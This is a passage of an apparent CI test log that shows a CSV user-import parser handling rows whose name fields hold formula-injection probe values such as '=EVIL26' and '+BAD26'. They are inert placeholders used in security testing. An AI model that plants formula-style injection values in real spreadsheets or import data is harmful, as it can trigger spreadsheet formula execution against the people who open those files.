2025-11-18T17:36:03.5172231Z   cellValues: [ [32m'user26@example.com'[39m, [32m'=EVIL26'[39m, [32m'+BAD26'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5172999Z   columnMapping: {
2025-11-18T17:36:03.5173458Z     email: [33m0[39m,
2025-11-18T17:36:03.5173908Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5174373Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5174832Z     role: [33m3[39m,
2025-11-18T17:36:03.5175265Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5175711Z     password: [33m-1[39m
2025-11-18T17:36:03.5176364Z   }
2025-11-18T17:36:03.5176652Z }
2025-11-18T17:36:03.5177366Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5178013Z   email: [32m'user26@example.com'[39m,
2025-11-18T17:36:03.5178625Z   firstName: [32m'=EVIL26'[39m,
2025-11-18T17:36:03.5179184Z   lastName: [32m'+BAD26'[39m,
2025-11-18T17:36:03.5179657Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5180150Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5180514Z }
2025-11-18T17:36:03.5180854Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5181319Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5182298Z   cellValues: [ [32m'user27@example.com'[39m, [32m'=EVIL27'[39m, [32m'+BAD27'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5183066Z   columnMapping: {
2025-11-18T17:36:03.5183516Z     email: [33m0[39m,
2025-11-18T17:36:03.5183980Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5184464Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5184911Z     role: [33m3[39m,
2025-11-18T17:36:03.5185344Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5185795Z     password: [33m-1[39m
2025-11-18T17:36:03.5186170Z   }
2025-11-18T17:36:03.5186445Z }
2025-11-18T17:36:03.5187015Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5187653Z   email: [32m'user27@example.com'[39m,
2025-11-18T17:36:03.5188282Z   firstName: [32m'=EVIL27'[39m,
2025-11-18T17:36:03.5188839Z   lastName: [32m'+BAD27'[39m,
2025-11-18T17:36:03.5189346Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5190103Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5190533Z }
2025-11-18T17:36:03.5190889Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5191416Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5192415Z   cellValues: [ [32m'user28@example.com'[39m, [32m'=EVIL28'[39m, [32m'+BAD28'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5193208Z   columnMapping: {
2025-11-18T17:36:03.5193666Z     email: [33m0[39m,
2025-11-18T17:36:03.5194129Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5194610Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5195066Z     role: [33m3[39m,
2025-11-18T17:36:03.5195516Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5195959Z     password: [33m-1[39m
2025-11-18T17:36:03.5196329Z   }
2025-11-18T17:36:03.5196596Z }
2025-11-18T17:36:03.5197210Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5197863Z   email: [32m'user28@example.com'[39m,
2025-11-18T17:36:03.5198549Z   firstName: [32m'=EVIL28'[39m,
2025-11-18T17:36:03.5199098Z   lastName: [32m'+BAD28'[39m,
2025-11-18T17:36:03.5199624Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5200175Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5200563Z }
2025-11-18T17:36:03.5200887Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5201362Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5202325Z   cellValues: [ [32m'user29@example.com'[39m, [32m'=EVIL29'[39m, [32m'+BAD29'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5203093Z   columnMapping: {
2025-11-18T17:36:03.5203547Z     email: [33m0[39m,
2025-11-18T17:36:03.5203997Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5204461Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5204882Z     role: [33m3[39m,
2025-11-18T17:36:03.5205274Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5205675Z     password: [33m-1[39m
2025-11-18T17:36:03.5206026Z   }
2025-11-18T17:36:03.5206300Z }
2025-11-18T17:36:03.5206701Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5207542Z   email: [32m'user29@example.com'[39m,
2025-11-18T17:36:03.5208189Z   firstName: [32m'=EVIL29'[39m,
2025-11-18T17:36:03.5208747Z   lastName: [32m'+BAD29'[39m,
2025-11-18T17:36:03.5209253Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5209767Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5210145Z }
2025-11-18T17:36:03.5210499Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5211022Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5212017Z   cellValues: [ [32m'user30@example.com'[39m, [32m'=EVIL30'[39m, [32m'+BAD30'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5212797Z   columnMapping: {
2025-11-18T17:36:03.5213279Z     email: [33m0[39m,
2025-11-18T17:36:03.5214018Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5214494Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5214943Z     role: [33m3[39m,
2025-11-18T17:36:03.5215368Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5215803Z     password: [33m-1[39m
2025-11-18T17:36:03.5216170Z   }
2025-11-18T17:36:03.5216442Z }
2025-11-18T17:36:03.5217028Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5217666Z   email: [32m'user30@example.com'[39m,
2025-11-18T17:36:03.5218270Z   firstName: [32m'=EVIL30'[39m,
2025-11-18T17:36:03.5218832Z   lastName: [32m'+BAD30'[39m,
2025-11-18T17:36:03.5219322Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5219825Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5220213Z }
2025-11-18T17:36:03.5220562Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5221054Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5222055Z   cellValues: [ [32m'user31@example.com'[39m, [32m'=EVIL31'[39m, [32m'+BAD31'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5222836Z   columnMapping: {
2025-11-18T17:36:03.5223303Z     email: [33m0[39m,
2025-11-18T17:36:03.5223741Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5224207Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5224711Z     role: [33m3[39m,
2025-11-18T17:36:03.5225189Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5225673Z     password: [33m-1[39m
2025-11-18T17:36:03.5226033Z   }
2025-11-18T17:36:03.5226308Z }
2025-11-18T17:36:03.5227102Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5227792Z   email: [32m'user31@example.com'[39m,
2025-11-18T17:36:03.5228405Z   firstName: [32m'=EVIL31'[39m,
2025-11-18T17:36:03.5228955Z   lastName: [32m'+BAD31'[39m,
2025-11-18T17:36:03.5229452Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5229972Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5230357Z }
2025-11-18T17:36:03.5230703Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5231214Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5232217Z   cellValues: [ [32m'user32@example.com'[39m, [32m'=EVIL32'[39m, [32m'+BAD32'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5233062Z   columnMapping: {
2025-11-18T17:36:03.5233605Z     email: [33m0[39m,
2025-11-18T17:36:03.5234058Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5234511Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5234934Z     role: [33m3[39m,
2025-11-18T17:36:03.5235342Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5235783Z     password: [33m-1[39m
2025-11-18T17:36:03.5236154Z   }
2025-11-18T17:36:03.5236447Z }
2025-11-18T17:36:03.5237019Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5237652Z   email: [32m'user32@example.com'[39m,
2025-11-18T17:36:03.5238260Z   firstName: [32m'=EVIL32'[39m,
2025-11-18T17:36:03.5238758Z   lastName: [32m'+BAD32'[39m,
2025-11-18T17:36:03.5239194Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5239674Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5240054Z }
2025-11-18T17:36:03.5240387Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5240861Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5241825Z   cellValues: [ [32m'user33@example.com'[39m, [32m'=EVIL33'[39m, [32m'+BAD33'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5242570Z   columnMapping: {
2025-11-18T17:36:03.5242965Z     email: [33m0[39m,
2025-11-18T17:36:03.5243360Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5243771Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5244174Z     role: [33m3[39m,
2025-11-18T17:36:03.5244556Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5244954Z     password: [33m-1[39m
2025-11-18T17:36:03.5245291Z   }
2025-11-18T17:36:03.5245545Z }
2025-11-18T17:36:03.5245922Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5246463Z   email: [32m'user33@example.com'[39m,
2025-11-18T17:36:03.5247316Z   firstName: [32m'=EVIL33'[39m,
2025-11-18T17:36:03.5247811Z   lastName: [32m'+BAD33'[39m,
2025-11-18T17:36:03.5248246Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5248726Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5249071Z }
2025-11-18T17:36:03.5249384Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5250047Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5251012Z   cellValues: [ [32m'user34@example.com'[39m, [32m'=EVIL34'[39m, [32m'+BAD34'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5251787Z   columnMapping: {
2025-11-18T17:36:03.5252229Z     email: [33m0[39m,
2025-11-18T17:36:03.5252662Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5253166Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5253625Z     role: [33m3[39m,
2025-11-18T17:36:03.5254036Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5254471Z     password: [33m-1[39m
2025-11-18T17:36:03.5254856Z   }
2025-11-18T17:36:03.5255132Z }
2025-11-18T17:36:03.5255535Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5256173Z   email: [32m'user34@example.com'[39m,
2025-11-18T17:36:03.5256977Z   firstName: [32m'=EVIL34'[39m,
2025-11-18T17:36:03.5257539Z   lastName: [32m'+BAD34'[39m,
2025-11-18T17:36:03.5258051Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5258576Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5258968Z }
2025-11-18T17:36:03.5259284Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5259738Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5260677Z   cellValues: [ [32m'user35@example.com'[39m, [32m'=EVIL35'[39m, [32m'+BAD35'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5261404Z   columnMapping: {
2025-11-18T17:36:03.5261787Z     email: [33m0[39m,
2025-11-18T17:36:03.5262175Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5262790Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5263205Z     role: [33m3[39m,
2025-11-18T17:36:03.5263571Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5263943Z     password: [33m-1[39m
2025-11-18T17:36:03.5264266Z   }
2025-11-18T17:36:03.5264513Z }
2025-11-18T17:36:03.5264861Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5265384Z   email: [32m'user35@example.com'[39m,
2025-11-18T17:36:03.5265905Z   firstName: [32m'=EVIL35'[39m,
2025-11-18T17:36:03.5266395Z   lastName: [32m'+BAD35'[39m,
2025-11-18T17:36:03.5267031Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5267547Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5267934Z }
2025-11-18T17:36:03.5268275Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5268760Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5269721Z   cellValues: [ [32m'user36@example.com'[39m, [32m'=EVIL36'[39m, [32m'+BAD36'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5270503Z   columnMapping: {
2025-11-18T17:36:03.5270948Z     email: [33m0[39m,
2025-11-18T17:36:03.5271372Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5271841Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5272286Z     role: [33m3[39m,
2025-11-18T17:36:03.5272725Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5273168Z     password: [33m-1[39m
2025-11-18T17:36:03.5273541Z   }
2025-11-18T17:36:03.5273805Z }
2025-11-18T17:36:03.5274189Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5274805Z   email: [32m'user36@example.com'[39m,
2025-11-18T17:36:03.5275393Z   firstName: [32m'=EVIL36'[39m,
2025-11-18T17:36:03.5275930Z   lastName: [32m'+BAD36'[39m,
2025-11-18T17:36:03.5276422Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5277308Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5277724Z }
2025-11-18T17:36:03.5278070Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5278565Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5279492Z   cellValues: [ [32m'user37@example.com'[39m, [32m'=EVIL37'[39m, [32m'+BAD37'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5280201Z   columnMapping: {
2025-11-18T17:36:03.5280593Z     email: [33m0[39m,
2025-11-18T17:36:03.5280983Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5281387Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5282055Z     role: [33m3[39m,
2025-11-18T17:36:03.5282295Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5282532Z     password: [33m-1[39m
2025-11-18T17:36:03.5282732Z   }
2025-11-18T17:36:03.5282886Z }
2025-11-18T17:36:03.5283097Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5283421Z   email: [32m'user37@example.com'[39m,
2025-11-18T17:36:03.5283737Z   firstName: [32m'=EVIL37'[39m,
2025-11-18T17:36:03.5284233Z   lastName: [32m'+BAD37'[39m,
2025-11-18T17:36:03.5284498Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5284771Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5284994Z }
2025-11-18T17:36:03.5285187Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5285437Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5285958Z   cellValues: [ [32m'user38@example.com'[39m, [32m'=EVIL38'[39m, [32m'+BAD38'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5286369Z   columnMapping: {
2025-11-18T17:36:03.5286590Z     email: [33m0[39m,
2025-11-18T17:36:03.5287161Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5287619Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5288006Z     role: [33m3[39m,
2025-11-18T17:36:03.5288379Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5288739Z     password: [33m-1[39m
2025-11-18T17:36:03.5289060Z   }
2025-11-18T17:36:03.5289321Z }
2025-11-18T17:36:03.5289675Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5290204Z   email: [32m'user38@example.com'[39m,
2025-11-18T17:36:03.5290744Z   firstName: [32m'=EVIL38'[39m,
2025-11-18T17:36:03.5291246Z   lastName: [32m'+BAD38'[39m,
2025-11-18T17:36:03.5291687Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5292159Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5292511Z }
2025-11-18T17:36:03.5292818Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5293240Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5294330Z   cellValues: [ [32m'user39@example.com'[39m, [32m'=EVIL39'[39m, [32m'+BAD39'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5295052Z   columnMapping: {
2025-11-18T17:36:03.5295443Z     email: [33m0[39m,
2025-11-18T17:36:03.5295849Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5296317Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5297063Z     role: [33m3[39m,
2025-11-18T17:36:03.5297517Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5297959Z     password: [33m-1[39m
2025-11-18T17:36:03.5298155Z   }
2025-11-18T17:36:03.5298291Z }
2025-11-18T17:36:03.5298547Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5298877Z   email: [32m'user39@example.com'[39m,
2025-11-18T17:36:03.5299150Z   firstName: [32m'=EVIL39'[39m,
2025-11-18T17:36:03.5299403Z   lastName: [32m'+BAD39'[39m,
2025-11-18T17:36:03.5299617Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5299882Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5300022Z }
2025-11-18T17:36:03.5300222Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5300479Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5301234Z   cellValues: [ [32m'user40@example.com'[39m, [32m'=EVIL40'[39m, [32m'+BAD40'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5301399Z   columnMapping: {
2025-11-18T17:36:03.5301623Z     email: [33m0[39m,
2025-11-18T17:36:03.5301846Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5302049Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5302245Z     role: [33m3[39m,
2025-11-18T17:36:03.5302454Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5302665Z     password: [33m-1[39m
2025-11-18T17:36:03.5302803Z   }
2025-11-18T17:36:03.5302925Z }
2025-11-18T17:36:03.5303169Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5303481Z   email: [32m'user40@example.com'[39m,
2025-11-18T17:36:03.5303741Z   firstName: [32m'=EVIL40'[39m,
2025-11-18T17:36:03.5304003Z   lastName: [32m'+BAD40'[39m,
2025-11-18T17:36:03.5304217Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5304478Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5304614Z }
2025-11-18T17:36:03.5304821Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5305064Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5305797Z   cellValues: [ [32m'user41@example.com'[39m, [32m'=EVIL41'[39m, [32m'+BAD41'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5305965Z   columnMapping: {
2025-11-18T17:36:03.5306188Z     email: [33m0[39m,
2025-11-18T17:36:03.5306403Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5306616Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5307022Z     role: [33m3[39m,
2025-11-18T17:36:03.5307237Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5307697Z     password: [33m-1[39m
2025-11-18T17:36:03.5307828Z   }
2025-11-18T17:36:03.5307947Z }
2025-11-18T17:36:03.5308187Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5308480Z   email: [32m'user41@example.com'[39m,
2025-11-18T17:36:03.5308741Z   firstName: [32m'=EVIL41'[39m,
2025-11-18T17:36:03.5309005Z   lastName: [32m'+BAD41'[39m,
2025-11-18T17:36:03.5309213Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5309490Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5309611Z }
2025-11-18T17:36:03.5309804Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5310017Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5310759Z   cellValues: [ [32m'user42@example.com'[39m, [32m'=EVIL42'[39m, [32m'+BAD42'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5310919Z   columnMapping: {
2025-11-18T17:36:03.5311150Z     email: [33m0[39m,
2025-11-18T17:36:03.5311374Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5311574Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5311781Z     role: [33m3[39m,
2025-11-18T17:36:03.5311976Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5312189Z     password: [33m-1[39m
2025-11-18T17:36:03.5312313Z   }
2025-11-18T17:36:03.5312440Z }
2025-11-18T17:36:03.5312697Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5313021Z   email: [32m'user42@example.com'[39m,
2025-11-18T17:36:03.5313303Z   firstName: [32m'=EVIL42'[39m,
2025-11-18T17:36:03.5313782Z   lastName: [32m'+BAD42'[39m,
2025-11-18T17:36:03.5314043Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5314318Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5314445Z }
2025-11-18T17:36:03.5314642Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5314856Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5315597Z   cellValues: [ [32m'user43@example.com'[39m, [32m'=EVIL43'[39m, [32m'+BAD43'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5315753Z   columnMapping: {
2025-11-18T17:36:03.5315980Z     email: [33m0[39m,
2025-11-18T17:36:03.5316190Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5316406Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5316601Z     role: [33m3[39m,
2025-11-18T17:36:03.5317018Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5317281Z     password: [33m-1[39m
2025-11-18T17:36:03.5317405Z   }
2025-11-18T17:36:03.5317532Z }
2025-11-18T17:36:03.5317775Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5318098Z   email: [32m'user43@example.com'[39m,
2025-11-18T17:36:03.5318368Z   firstName: [32m'=EVIL43'[39m,
2025-11-18T17:36:03.5318628Z   lastName: [32m'+BAD43'[39m,
2025-11-18T17:36:03.5318847Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5319115Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5319241Z }
2025-11-18T17:36:03.5319432Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5319658Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5320408Z   cellValues: [ [32m'user44@example.com'[39m, [32m'=EVIL44'[39m, [32m'+BAD44'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5320574Z   columnMapping: {
2025-11-18T17:36:03.5320829Z     email: [33m0[39m,
2025-11-18T17:36:03.5321062Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5321562Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5321804Z     role: [33m3[39m,
2025-11-18T17:36:03.5322239Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5322489Z     password: [33m-1[39m
2025-11-18T17:36:03.5322818Z   }
2025-11-18T17:36:03.5322962Z }
2025-11-18T17:36:03.5323206Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5323571Z   email: [32m'user44@example.com'[39m,
2025-11-18T17:36:03.5323839Z   firstName: [32m'=EVIL44'[39m,
2025-11-18T17:36:03.5324111Z   lastName: [32m'+BAD44'[39m,
2025-11-18T17:36:03.5324335Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5324606Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5324741Z }
2025-11-18T17:36:03.5325261Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5325544Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5326299Z   cellValues: [ [32m'user45@example.com'[39m, [32m'=EVIL45'[39m, [32m'+BAD45'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5326717Z   columnMapping: {
2025-11-18T17:36:03.5327951Z     email: [33m0[39m,
2025-11-18T17:36:03.5328232Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5328657Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5328876Z     role: [33m3[39m,
2025-11-18T17:36:03.5329076Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5329283Z     password: [33m-1[39m
2025-11-18T17:36:03.5329411Z   }
2025-11-18T17:36:03.5329532Z }
2025-11-18T17:36:03.5329788Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5330129Z   email: [32m'user45@example.com'[39m,
2025-11-18T17:36:03.5330403Z   firstName: [32m'=EVIL45'[39m,
2025-11-18T17:36:03.5330656Z   lastName: [32m'+BAD45'[39m,
2025-11-18T17:36:03.5330864Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5331130Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5331256Z }
2025-11-18T17:36:03.5331454Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5331693Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5332683Z   cellValues: [ [32m'user46@example.com'[39m, [32m'=EVIL46'[39m, [32m'+BAD46'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5333093Z   columnMapping: {
2025-11-18T17:36:03.5333344Z     email: [33m0[39m,
2025-11-18T17:36:03.5333779Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5334208Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5334458Z     role: [33m3[39m,
2025-11-18T17:36:03.5334872Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5335092Z     password: [33m-1[39m
2025-11-18T17:36:03.5335444Z   }
2025-11-18T17:36:03.5335580Z }
2025-11-18T17:36:03.5335826Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5336145Z   email: [32m'user46@example.com'[39m,
2025-11-18T17:36:03.5336702Z   firstName: [32m'=EVIL46'[39m,
2025-11-18T17:36:03.5337344Z   lastName: [32m'+BAD46'[39m,
2025-11-18T17:36:03.5337809Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5338071Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5338197Z }
2025-11-18T17:36:03.5338394Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5338603Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5339347Z   cellValues: [ [32m'user47@example.com'[39m, [32m'=EVIL47'[39m, [32m'+BAD47'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5339498Z   columnMapping: {
2025-11-18T17:36:03.5339711Z     email: [33m0[39m,
2025-11-18T17:36:03.5339920Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5340114Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5340308Z     role: [33m3[39m,
2025-11-18T17:36:03.5340489Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5340700Z     password: [33m-1[39m
2025-11-18T17:36:03.5340818Z   }
2025-11-18T17:36:03.5340932Z }
2025-11-18T17:36:03.5341171Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5341524Z   email: [32m'user47@example.com'[39m,
2025-11-18T17:36:03.5341794Z   firstName: [32m'=EVIL47'[39m,
2025-11-18T17:36:03.5342037Z   lastName: [32m'+BAD47'[39m,
2025-11-18T17:36:03.5342244Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5342484Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5342597Z }
2025-11-18T17:36:03.5342784Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5342988Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5343720Z   cellValues: [ [32m'user48@example.com'[39m, [32m'=EVIL48'[39m, [32m'+BAD48'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5343871Z   columnMapping: {
2025-11-18T17:36:03.5344078Z     email: [33m0[39m,
2025-11-18T17:36:03.5344279Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5344468Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5344663Z     role: [33m3[39m,
2025-11-18T17:36:03.5344847Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5345054Z     password: [33m-1[39m
2025-11-18T17:36:03.5345169Z   }
2025-11-18T17:36:03.5345288Z }
2025-11-18T17:36:03.5345521Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5345829Z   email: [32m'user48@example.com'[39m,
2025-11-18T17:36:03.5346094Z   firstName: [32m'=EVIL48'[39m,
2025-11-18T17:36:03.5346350Z   lastName: [32m'+BAD48'[39m,
2025-11-18T17:36:03.5346566Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5347008Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5347380Z }
2025-11-18T17:36:03.5347575Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5347824Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5348556Z   cellValues: [ [32m'user49@example.com'[39m, [32m'=EVIL49'[39m, [32m'+BAD49'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5348706Z   columnMapping: {
2025-11-18T17:36:03.5348906Z     email: [33m0[39m,
2025-11-18T17:36:03.5349098Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5349309Z     lastName: [33m2[39m,
